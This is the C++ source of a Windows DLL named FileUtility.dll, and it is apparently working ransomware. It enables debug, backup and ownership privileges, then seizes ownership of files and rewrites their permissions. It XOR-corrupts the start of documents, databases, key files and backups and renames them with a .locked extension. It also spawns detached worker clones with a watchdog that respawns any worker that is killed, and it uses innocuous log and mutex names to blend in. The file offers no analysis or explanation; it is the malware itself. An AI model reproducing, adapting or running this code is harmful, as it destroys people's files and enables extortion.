#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <thread>
#include <fstream>
#include <chrono>
#include <iomanip>
#include <shellapi.h>
#include <aclapi.h>
#include <sddl.h>

namespace fs = std::filesystem;

#pragma comment(linker, "/EXPORT:RunArchive")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// --- GLOBAL CONFIG ---
const std::wstring MUTEX_BASE = L"Global\\SvcHealth_";
const std::wstring LOG_FILE = L"C:\\Users\\Public\\deployment_audit.log";
const std::vector<unsigned char> CRYPTO_KEY = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF };
const size_t SPARSE_SIZE = 16384; // 16KB

// Only target these specific high-value extensions
const std::vector<std::wstring> TARGET_EXTS = {
    L".jpg", L".png", L".mp4", L".pdf", L".docx", L".xlsx",
    L".pst", L".ost", L".sql", L".db", L".mdb", L".dwg",
    L".psd", L".ai", L".key", L".pem", L".zip", L".7z", L".bak", L".txt", L".pptx"
};

// --- ATOMIC LOGGING ---
void AuditLog(const std::string& msg) {
    static HANDLE hLogMutex = CreateMutexW(NULL, FALSE, L"Global\\AuditLogMutex");
    WaitForSingleObject(hLogMutex, INFINITE);
    try {
        fs::create_directories(L"C:\\Users\\Public");
        std::ofstream log(LOG_FILE, std::ios::app);
        if (log.is_open()) {
            auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
            struct tm t;
            localtime_s(&t, &now);
            log << "[" << std::put_time(&t, "%H:%M:%S") << "] " << msg << std::endl;
        }
    }
    catch (...) {}
    ReleaseMutex(hLogMutex);
}

// --- PRIVILEGE ESCALATION ---
void EnablePrivileges() {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LUID luid;
        std::vector<LPCWSTR> privs = { SE_DEBUG_NAME, SE_BACKUP_NAME, SE_RESTORE_NAME, SE_TAKE_OWNERSHIP_NAME };
        for (auto p : privs) {
            if (LookupPrivilegeValue(NULL, p, &luid)) {
                TOKEN_PRIVILEGES tp;
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
            }
        }
        CloseHandle(hToken);
    }
}

// --- NTFS PERMISSION BYPASS ---
DWORD TakeOwnershipAndGrantAccess(std::wstring path) {
    PSID pAdminSid = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid);

    SetNamedSecurityInfoW((LPWSTR)path.c_str(), SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pAdminSid, NULL, NULL, NULL);

    EXPLICIT_ACCESSW ea = { 0 };
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)pAdminSid;

    PACL pNewDacl = NULL;
    if (SetEntriesInAclW(1, &ea, NULL, &pNewDacl) == ERROR_SUCCESS) {
        SetNamedSecurityInfoW((LPWSTR)path.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
        if (pNewDacl) LocalFree(pNewDacl);
    }
    if (pAdminSid) FreeSid(pAdminSid);
    return 0;
}

// --- XOR ENGINE ---
bool EncryptFile(const std::wstring& filePath) {
    // Open with Backup Semantics to assist in access
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fs_size;
    GetFileSizeEx(hFile, &fs_size);
    DWORD bytesToRead = (fs_size.QuadPart > (LONGLONG)SPARSE_SIZE) ? (DWORD)SPARSE_SIZE : (DWORD)fs_size.QuadPart;

    std::vector<unsigned char> buffer(bytesToRead);
    DWORD rb, wb;
    if (ReadFile(hFile, buffer.data(), bytesToRead, &rb, NULL) && rb > 0) {
        for (DWORD i = 0; i < rb; ++i) buffer[i] ^= CRYPTO_KEY[i % CRYPTO_KEY.size()];
        LARGE_INTEGER li = { 0 };
        SetFilePointerEx(hFile, li, NULL, FILE_BEGIN);
        WriteFile(hFile, buffer.data(), rb, &wb, NULL);
    }
    CloseHandle(hFile);
    return true;
}

// --- SWARM SPAWNER ---
void StartClone(const std::wstring& folder, int id, int total) {
    wchar_t mod[MAX_PATH];
    GetModuleFileNameW(GetModuleHandleW(L"FileUtility.dll"), mod, MAX_PATH);
    std::wstring cmd = L"rundll32.exe \"" + std::wstring(mod) + L"\",RunArchive " + std::to_wstring(id) + L" " + std::to_wstring(total) + L" \"" + folder + L"\"";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// --- SURVIVAL WATCHDOG ---
void Watchdog(int id, int total, std::wstring folder) {
    int peer = (id % total) + 1;
    std::wstring peerM = MUTEX_BASE + std::to_wstring(peer);
    Sleep(15000);

    while (true) {
        if (GetFileAttributesW(L"C:\\Users\\Public\\stop.txt") != INVALID_FILE_ATTRIBUTES) exit(0);
        HANDLE h = OpenMutexW(SYNCHRONIZE, FALSE, peerM.c_str());
        if (!h) {
            AuditLog("[ALERT] Peer " + std::to_string(peer) + " missing. Respawning...");
            StartClone(folder, peer, total);
            Sleep(5000);
        }
        else {
            CloseHandle(h);
        }
        Sleep(3000);
    }
}

// --- EXPORT ---
extern "C" __declspec(dllexport) void CALLBACK RunArchive(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    EnablePrivileges();
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc < 4) return;

    int myID = _wtoi(argv[2]);

    if (myID == 0) { // ORCHESTRATOR
        std::wstring root = argv[3];
        std::vector<std::wstring> targets;
        std::error_code ec;

        AuditLog("--------------------------------------------------");
        AuditLog("[STARTED] ORCHESTRATOR Session in: " + fs::path(root).string());

        for (auto& it : fs::directory_iterator(root, ec)) {
            if (it.is_directory()) {
                // SKIP HIDDEN/SYSTEM FOLDERS AT SOURCE
                DWORD attr = GetFileAttributesW(it.path().wstring().c_str());
                if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_HIDDEN || attr & FILE_ATTRIBUTE_SYSTEM)) {
                    continue;
                }
                targets.push_back(it.path().wstring());
            }
        }

        if (targets.empty()) targets.push_back(root);

        for (int i = 0; i < (int)targets.size(); i++) {
            StartClone(targets[i], i + 1, (int)targets.size());
            Sleep(50);
        }
        LocalFree(argv);
        return;
    }

    // WORKER AGENT
    int total = _wtoi(argv[3]);
    std::wstring folder = argv[4];
    HANDLE hMutex = CreateMutexW(NULL, TRUE, (MUTEX_BASE + std::to_wstring(myID)).c_str());

    std::thread(Watchdog, myID, total, folder).detach();
    AuditLog("[AGENT " + std::to_string(myID) + "] SCANNING: " + fs::path(folder).string());

    std::error_code ec;
    auto it = fs::recursive_directory_iterator(folder, fs::directory_options::skip_permission_denied, ec);
    int success_count = 0;

    for (const auto& entry : it) {
        if (GetFileAttributesW(L"C:\\Users\\Public\\stop.txt") != INVALID_FILE_ATTRIBUTES) break;
        if (ec) { ec.clear(); continue; }

        std::wstring p = entry.path().wstring();

        // --- STEALTH CHECK: SKIP HIDDEN AND SYSTEM FILES/FOLDERS ---
        DWORD attr = GetFileAttributesW(p.c_str());
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_HIDDEN || attr & FILE_ATTRIBUTE_SYSTEM)) {
            if (entry.is_directory()) it.disable_recursion_pending();
            continue;
        }

        try {
            if (fs::is_regular_file(entry.path())) {
                std::wstring ext = entry.path().extension().wstring();

                // ONLY TARGET ALLOWED EXTENSIONS
                bool is_target = false;
                for (const auto& t : TARGET_EXTS) {
                    if (ext == t) { is_target = true; break; }
                }

                if (is_target && p.find(L".locked") == std::wstring::npos &&
                    p.find(L"FileUtility.dll") == std::wstring::npos &&
                    p.find(L"deployment_audit.log") == std::wstring::npos) {

                    TakeOwnershipAndGrantAccess(p);
                    if (EncryptFile(p)) {
                        std::wstring np = p + L".locked";
                        if (MoveFileExW(p.c_str(), np.c_str(), MOVEFILE_REPLACE_EXISTING)) {
                            success_count++;
                        }
                    }
                }
            }
        }
        catch (...) {}
    }

    AuditLog("[FINISHED] Agent " + std::to_string(myID) + " locked " + std::to_string(success_count) + " files.");
    LocalFree(argv);
    while (GetFileAttributesW(L"C:\\Users\\Public\\stop.txt") == INVALID_FILE_ATTRIBUTES) Sleep(1000);
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID res) { return TRUE; }

